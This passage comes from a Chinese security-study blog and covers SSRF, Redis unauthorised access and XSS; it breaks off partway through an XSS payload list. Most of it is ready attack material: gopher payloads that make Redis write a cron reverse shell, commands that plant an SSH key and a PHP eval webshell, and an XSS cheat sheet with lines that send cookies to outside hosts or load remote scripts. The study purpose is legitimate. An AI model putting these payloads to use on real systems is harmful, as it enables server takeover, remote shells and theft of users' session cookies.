<li>提交方法混淆<br>　　  有些<code>WAF</code>的规则是：如果数据包为<code>POST</code>类型，则校验数据包内容。<br>　　  此种情况可以上传一个<code>POST</code>型的数据包，抓包将<code>POST</code>改为<code>GET</code>。然后仍然传输<code>POST</code>的数据。<br>　　  利用<code>waf</code>本身缺陷删除实体里面的<code>Conten-Type</code>字段<br>　　  可以参考基与文件内容的绕过方法，可以利用多种形式对<code>Conten-Type</code>进行绕过。</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/漏洞学习/SSRF漏洞学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/漏洞学习/SSRF漏洞学习/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="什么是-SSRF-？"><a href="#什么是-SSRF-？" class="headerlink" title="什么是 SSRF ？"></a>什么是 SSRF ？</h4><p>简介：SSRF(Server-Side Request Forgery)服务端请求伪造，是一种由攻击者构造形成由服务器端发起请求的一个漏洞，一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统。<hr></p>
<h4 id="SSRF危害即可以实现的攻击行为"><a href="#SSRF危害即可以实现的攻击行为" class="headerlink" title="SSRF危害即可以实现的攻击行为"></a>SSRF危害即可以实现的攻击行为</h4><ol>
<li>主机本地敏感信息读取， 对外网、服务器所在内网、本地进行端口扫描，获取一些服务的<code>Banner</code>信息</li>
<li>攻击运行在内外网主机的应用程序</li>
<li>通过访问默认文件对内网 <code>Web</code> 应用进行指纹识别</li>
<li>攻击内外网的 <code>Web</code> 应用，主要是使用 <code>GET</code>参数就可以实现的攻击</li>
<li>利用<code>file</code>协议读取本地文件</li>
</ol>
<p><hr></p>
<h4 id="可进行利用的协议"><a href="#可进行利用的协议" class="headerlink" title="可进行利用的协议"></a>可进行利用的协议</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FILE                           读取服务器上任意文件内容</span><br><span class="line">IMAP/IMAPS/POP3SMTP/SMTPS      爆破邮件用户名密码</span><br><span class="line">FTP/FTPS                       FTP匿名访问、爆破</span><br><span class="line">DICT                           操作内网Redis等服务</span><br><span class="line">GOPHER                         能够将所有操作转成数据流，并将数据流一次发出去，可以用来探测内网的所有服务的所有漏洞</span><br><span class="line">TFTP                           UDP协议扩展</span><br></pre></td></tr></table></figure>
<p>使用<code>curl -V</code>命令可以查看<code>Ubuntu 16.04</code>版本下默认的<code>libcurl</code>支持的协议</p>
<h4 id="PHP中容易造成漏洞的函数"><a href="#PHP中容易造成漏洞的函数" class="headerlink" title="PHP中容易造成漏洞的函数"></a>PHP中容易造成漏洞的函数</h4><blockquote>
<p>curl_exec()<br>file_get_contents()<br>fsockopen()</p>
</blockquote>
<p><hr></p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
<li>本地利用</li>
</ul>
<p>利用方式</p>
<ol>
<li><p>利用file协议查看文件</p>
<blockquote>
<p>curl -v ‘file:///etc/passwd’            </p>
</blockquote>
</li>
<li><p>利用dict探测端口</p>
<blockquote>
<p>curl -v ‘dict://127.0.0.1:22’<br>curl -v ‘dict://127.0.0.1:6379/info’</p>
</blockquote>
</li>
<li><p>利用gopher协议反弹shell</p>
<blockquote>
<p><code>curl -v &#39;gopher://靶机ip:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$58%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#39;</code></p>
</blockquote>
</li>
</ol>
<p>更换IP和端口时，命令中的<code>$58</code>也要更改，<code>$58</code>表示字符串长度为58个字节，上面的EXP即是<code>%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1%0a%0a%0a%0a</code>，3+51+4=58。如果想换成<code>42.256.24.73</code>，那么<code>$58</code>需要改成<code>$61</code>，以此类推。</p>
<p>注：Windows下使用<code>curl</code>命令需要把单引号换成双引号</p>
<ul>
<li>远程利用</li>
</ul>
<p>例 1<br>  <code>ssrf.php</code> （未做任何ssrf防御）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;  </span><br><span class="line">    // 创建一个新cURL资源</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    // 设置URL和相应的选项</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    // 抓取URL并把它传递给浏览器</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    // 关闭cURL资源，并且释放系统资源</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url); </span><br><span class="line">?&gt;</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
<p><code>$GET_[&#39;url&#39;]</code>可控，从而可以发送任意请求站点，构成<code>ssrf</code>漏洞<br>利用方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 利用file协议任意文件读取</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=file:///etc/passwd&apos;</span><br><span class="line"></span><br><span class="line"># 利用dict协议查看端口</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=dict://127.0.0.1:22&apos;</span><br><span class="line"></span><br><span class="line"># 利用gopher协议反弹shell</span><br><span class="line">curl -v &apos;http://sec.com:8082/sec/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a&apos;</span><br></pre></td></tr></table></figure></p>
<p>例 2<br><code>ssrf2.php</code><br>    限制协议为HTTP、HTTPS<br>    设置跳转重定向为True（默认不跳转）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function curl($url)&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, True);</span><br><span class="line">    // 限制为HTTPS、HTTP协议</span><br><span class="line">    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[&apos;url&apos;];</span><br><span class="line">curl($url);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>此时使用<code>dict</code>协议已经不成功，可以利用<code>302跳转</code>的方式来绕过http协议限制</p>
<p><hr></p>
<h4 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h4><ol>
<li>限制协议为HTTP、HTTPS</li>
<li>限制302跳转次数</li>
<li>统一错误信息</li>
<li>限制内网IP</li>
</ol>
<hr>

<p>参考链接：<br><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">https://joychou.org/web/phpssrf.html</a><br><a href="http://www.mottoin.com/tech/115007.html" target="_blank" rel="noopener">http://www.mottoin.com/tech/115007.html</a><br><a href="https://feei.cn/ssrf" target="_blank" rel="noopener">https://feei.cn/ssrf</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/漏洞学习/Redis-未授权访问（反弹shell）/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/漏洞学习/Redis-未授权访问（反弹shell）/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="Redis安装"><a href="#Redis安装" class="headerlink" title="Redis安装"></a>Redis安装</h4><p>环境：Centos 7</p>
<ol>
<li>wget 获取 redis 安装包<blockquote>
<p>[ root@test ]#  wget <a href="http://download.redis.io/releases/redis-4.0.8.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-4.0.8.tar.gz</a></p>
</blockquote>
</li>
<li>解压<blockquote>
<p>[ root@test ]#  tar -zxvf redis-4.0.8.tar.gz</p>
</blockquote>
</li>
<li>yum安装gcc依赖<blockquote>
<p>[ root@test ]#  yum install gcc</p>
</blockquote>
</li>
<li>编译<blockquote>
<p>[ root@test redis-4.0.6 ]#  make MALLOC=libc</p>
</blockquote>
</li>
<li>将/redis-4.0.6/src目录下的文件加到/usr/local/bin目录<blockquote>
<p>[ root@test redis-4.0.6 ]#  cd src &amp;&amp; make install</p>
</blockquote>
</li>
<li><p>启动</p>
<blockquote>
<p>[ root@test src ]# ./redis-server</p>
</blockquote>
<p>如图即成功启动<br><img src="https://upload-images.jianshu.io/upload_images/12585049-9e65fefa59e87728.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
</li>
</ol>
<h4 id="反弹-shell-方法"><a href="#反弹-shell-方法" class="headerlink" title="反弹 shell 方法"></a>反弹 shell 方法</h4><h5 id="1-通过写SSH-KEY的方式获取shell"><a href="#1-通过写SSH-KEY的方式获取shell" class="headerlink" title="1.通过写SSH-KEY的方式获取shell"></a>1.通过写<code>SSH-KEY</code>的方式获取<code>shell</code></h5><p>利用条件：<br><code>redis</code> 以<code>root</code> 权限开启<br><code>6379</code> 端口开启并允许外部使用<br>目标服务器支持免密登录</p>
<ol>
<li>攻击机本地生成<code>ssh</code>秘钥<blockquote>
<p>[ root@test ]# ssh-keygen -t rsa</p>
</blockquote>
</li>
<li>将公钥导出写入<code>txt</code>文件方便利用<blockquote>
<p>[ root@test:~/.ssh ]# (echo -e “\n\n\n\n”; cat id_rsa.pub; echo -e “\n\n\n\n”) &gt;123.txt</p>
</blockquote>
</li>
<li>利用<code>redis-cli</code>进行远程连接<blockquote>
<p>[ root@test ] redis-cli -h 靶机ip</p>
</blockquote>
</li>
<li>设置<code>redis</code>工作路径、文件、写入公钥并保存<blockquote>
<p>靶机ip:6379&gt; config set dir /root/.ssh/<br>OK<br>靶机ip:6379&gt; config get dir<br>“dir”<br>“/root/.ssh”<br>靶机ip:6379&gt; config set dbfilename “authorized_keys”<br>OK<br>靶机ip:6379&gt; save<br>OK</p>
</blockquote>
</li>
<li>远程连接，利用自己的私钥登录服务器<blockquote>
<p>ssh -i id_rsa root@靶机ip</p>
</blockquote>
</li>
</ol>
<h5 id="2-向Web路径写webshell"><a href="#2-向Web路径写webshell" class="headerlink" title="2. 向Web路径写webshell"></a>2. 向<code>Web</code>路径写<code>webshell</code></h5><p>利用条件：<br>知道<code>web</code>目录<br>具有写入文件的权限</p>
<blockquote>
<p>靶机ip:6379&gt; config set dir /var/www/html/<br>OK<br>靶机ip:6379&gt; config set dbfilename shell.php<br>OK<br>靶机ip:6379&gt; set x “&lt;?php @eval($_POST[‘wcute’]);?&gt;”<br>OK<br>靶机ip:6379&gt; save<br>OK</p>
</blockquote>
<p>成功写入后可利用菜刀连接</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/漏洞学习/XSS漏洞学习/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="wcute">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo Test">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2018/12/09/漏洞学习/XSS漏洞学习/" itemprop="url">Untitled</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
                2018-12-09
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="XSS漏洞的原理"><a href="#XSS漏洞的原理" class="headerlink" title="XSS漏洞的原理"></a>XSS漏洞的原理</h4><p>XSS漏洞是发生在目标网站中目标用户的浏览层面上，当用户浏览器渲染整个HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就会发生。</p>
<h4 id="XSS漏洞的危害"><a href="#XSS漏洞的危害" class="headerlink" title="XSS漏洞的危害"></a>XSS漏洞的危害</h4><ul>
<li>获取用户或者管理员的Cookie</li>
<li>XSS蠕虫</li>
<li>钓鱼攻击</li>
<li>挂马</li>
<li>键盘记录等</li>
</ul>
<h4 id="以下是可能嵌入跨源的资源的一些示例："><a href="#以下是可能嵌入跨源的资源的一些示例：" class="headerlink" title="以下是可能嵌入跨源的资源的一些示例："></a>以下是可能嵌入跨源的资源的一些示例：</h4><ul>
<li><script src="..."></script> 标签嵌入跨域脚本。语法错误信息只能在同浪脚本中捕</li>
<li>&lt;link rel=”stylesheet” href＝”…”＞标签嵌入CSS。由于CSS的松散的语法规<br>则，CSS的跨域需要一个设置正确的 Content－Type消息头。不同浏览器有不同的限<br>制：IE， Firefox， Chrome， Safari（跳至CVE－2010－0051）部分和 Opera</li>
<li><img>嵌入图片。支持的图片格式包括PNG，JPEG，GlF，BMP，SVG，</li>
<li><video>和<audio>嵌入多媒体资源。</audio></video></li>
<li><object>，<embed>和<applet>的插件</applet></object></li>
<li>@font-face引入的字体。一些浏览器允许跨域字体（ cross－origin fonts），一些需要同<br>源字体（ same－origin fonts）</li>
<li><frame>和<iframe>载入的任何资源。站点可以使用 X-frame-optionsi消息头来阻止这<br>种形式的跨域交互。</iframe></li>
</ul>
<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><p>伪协议不同于因特网上所真实存在的协议，如http://，https://，ftp://，而是为关联应用程序而使用的。如:tencent://(关联QQ)，data:(用base64编码来在浏览器端输出二进制文件)，还有就是javascript: 我们可以在浏览地址栏里输入”javascript:alert(‘JS!’);”，点转到后会发现，实际上是把javascript: 后面的代码当JavaScript来执行，并将结果值返回给当前页面。（XSS Changes Stage #8）</p>
<h4 id="XSS-常用-payload"><a href="#XSS-常用-payload" class="headerlink" title="XSS 常用 payload"></a>XSS 常用 payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">&gt;&quot;&apos;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;XSS&gt;=&amp;&#123;()&#125;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;&#123;()&#125;</span><br><span class="line">&apos;&apos;;!--&quot;&lt;script&gt;alert(0);&lt;/script&gt;=&amp;&#123;(alert(1))&#125;</span><br><span class="line">`&gt;&lt;script&gt;alert(0)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;a=eval;b=alert;a(b(/i/.source));&lt;/script&gt;</span><br><span class="line">&lt;code onmouseover=a=eval;b=alert;a(b(/g/.source));&gt;HI&lt;/code&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=http://xssor.io/xss.js&gt;&lt;/SCRIPT&gt;</span><br><span class="line">&lt;script&gt;location.href=&apos;http://127.0.0.1:8088/cookie.php?cookie=&apos;+escape(document.cookie);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&apos;&quot;&gt;&lt;img onerror=alert(0) src=&gt;&lt;&quot;&apos;</span><br><span class="line">&lt;img src=http://127.0.0.1/myspace.asp&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:al&amp;#13;ert(0)&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:i=&quot;x=document.createElement(&apos;script&apos;);x.src=&apos;http://xssor.io/xn.js&apos;;x.defer=true;document.getElementsByTagName(&apos;head&apos;)[0].appendChild(x)&quot;;execScript(i)&gt;</span><br><span class="line">&lt;img src=&amp;#04jav&amp;#13;ascr&amp;#09;ipt:i=&quot;x=docu&amp;#13;ment.createElement(&apos;\u0053\u0043\u0052\u0049\u0050\u0054&apos;);x.src=&apos;http://xssor.io/xn.js&apos;;x.defer=true;doc&amp;#13;ument.getElementsByTagName(&apos;head&apos;)[0].appendChild(x)&quot;;execScri&amp;#13;pt(i)&gt;</span><br><span class="line">new Image().src=&quot;http://xssor.io/phishing/cookie.asp?cookie=&quot;+escape(document.cookie);</span><br><span class="line"></span><br><span class="line">&lt;iframe src=http://www.baidu.com/&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body background=javascript:alert(/xss/)&gt;&lt;/body&gt;</span><br><span class="line">body&#123;xxx:expression(eval(String.fromCharCode(105,102,40,33,119,105,110,100,111,119,46,120,41,123,97,108,101,114,116,40,39,120,115,115,39,41,59,119,105,110,100,111,119,46,120,61,49,59,125)))&#125;</span><br><span class="line">&lt;style&gt;body&#123;width:ｅxpression(parent.document.write(unescape(&apos;%3Cscript%20src%3Dhttp%3A//xssor.io/phishing/%3E%3C/script%3E&apos;)));&#125;&lt;/style&gt;</span><br><span class="line">a&#123;xxx:expression(if(!window.x)&#123;alert(&apos;xss&apos;);window.x=1;&#125;)&#125;</span><br><span class="line">a&#123;xxx:\65\78\70\72\65\73\73\69\6f\6e\28\69\66\28\21\77\69\6e\64\6f\77\2e\78\29\7b\61\6c\65\72\74\28\27\78\73\73\27\29\3b\77\69\6e\64\6f\77\2e\78\3d\31\3b\7d\29&#125;</span><br><span class="line">body&#123;background:url(&quot;javascript:alert(&apos;xss&apos;)&quot;)&#125;</span><br><span class="line">body&#123;background:url(JavAs	cr	</span><br><span class="line">ipt:alert(0))&#125;</span><br><span class="line">&lt;style&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;xss&quot;)&apos;;&lt;/style&gt;</span><br><span class="line">@i\6d\70o\72\74&apos;javascr\ipt:alert(document.cookie)&apos;;</span><br><span class="line">&lt;div style=xss:expres&amp;#92sion(if(!window.x)&#123;alert(&apos;xss&apos;);window.x=1;&#125;)&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">alert(String(/xss/).substr(1,3))</span><br><span class="line">alert(/xss/.source)</span><br><span class="line">&lt;a onclick=&quot;i=createElement(&apos;iframe&apos;);i.src=&apos;javascript:alert(/xss/)&apos;;x=parentNode;x.appendChild(i);&quot; href=&quot;#&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">x=&apos;\x61\x6c\x65\x72\x74\x28\x31\x29&apos;;new Function(x)()</span><br><span class="line">&lt;a href=&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgvWFNTLyk8L3NjcmlwdD4=&quot;&gt;Test&lt;/a&gt;</span><br><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line">&lt;embed src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;div style=&quot;-moz-binding:url(http://xssor.io/0.xml#xss);x:expression((window.r!=1)?eval(&apos;x=String.fromCharCode;scr=document.createElement(x(115,99,114,105,112,116));scr.setAttribute(x(115,114,99),x(104,116,116,112,58,47,47,119,119,119,46,48,120,51,55,46,99,111,109,47,48,46,106,115));document.getElementById(x(105,110,106,101,99,116)).appendChild(scr);window.r=1;&apos;):1);&quot;id=&quot;inject&quot;&gt;</span><br><span class="line"></span><br><span class="line">javascript:document.scripts[0].src=&apos;http://127.0.0.1/yy.js&apos;;void(0);</span><br><span class="line">&lt;a href=&quot;javascript:x=open(&apos;http://www.xiaonei.com/&apos;);setInterval (function()&#123;try&#123;x.frames[0].location=&#123;toString:function()&#123;return%20&apos;http://xssor.io/Project/poc/docshell.html&apos;;&#125;&#125;&#125;catch(e)&#123;&#125;&#125;,3000);void(1);&quot;&gt;Test&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&lt;script/onreadystatechange=alert(1)&gt;</span><br><span class="line">&lt;script/src=data:text/&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x000070&amp;#x074,alert(4)&gt;&lt;/script&gt;</span><br><span class="line">javascript:document.cookie=window.prompt(&quot;edit cookie:&quot;,document.cookie);void(0);</span><br><span class="line">&lt;input id=11 name=s value=`aa`onclick=alert(/xss/)&gt;</span><br><span class="line">&lt;input value:aa/onclick=alert(/xss/)&gt;</span><br><span class="line">&lt;li style=list-style:url() onerror=alert(1)&gt;</span><br><span class="line">&lt;div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)&gt;&lt;/div&gt;</span><br><span class="line">&lt;head&gt;&lt;base href=&quot;javascript://&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;a href=&quot;/. /,alert(1)//#&quot;&gt;XXX&lt;/a&gt;&lt;/body&gt;</span><br><span class="line">&lt;OBJECT CLASSID=&quot;clsid:333C7BC4-460F-11D0-BC04-0080C7055A83&quot;&gt;&lt;PARAM NAME=&quot;DataURL&quot; VALUE=&quot;javascript:alert(1)&quot;&gt;&lt;/OBJECT&gt;</span><br><span class="line">&lt;div id=&quot;div1&quot;&gt;&lt;input value=&quot;``onmouseover=alert(1)&quot;&gt;&lt;/div&gt; &lt;div id=&quot;div2&quot;&gt;&lt;/div&gt;&lt;script&gt;document.getElementById(&quot;div2&quot;).innerHTML = document.getElementById(&quot;div1&quot;).innerHTML;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">[!] ie only:</span><br><span class="line">&lt;div style=width:1px;filter:glow onfilterchange=alert(1)&gt;x</span><br><span class="line">&lt;title onpropertychange=alert(1)&gt;&lt;/title&gt;&lt;title title=&gt;</span><br><span class="line">&lt;!--[if]&gt;&lt;script&gt;alert(1)&lt;/script --&gt; &lt;!--[if&lt;img src=x onerror=alert(1)//]&gt; --&gt;</span><br><span class="line"></span><br><span class="line">[!] parsing 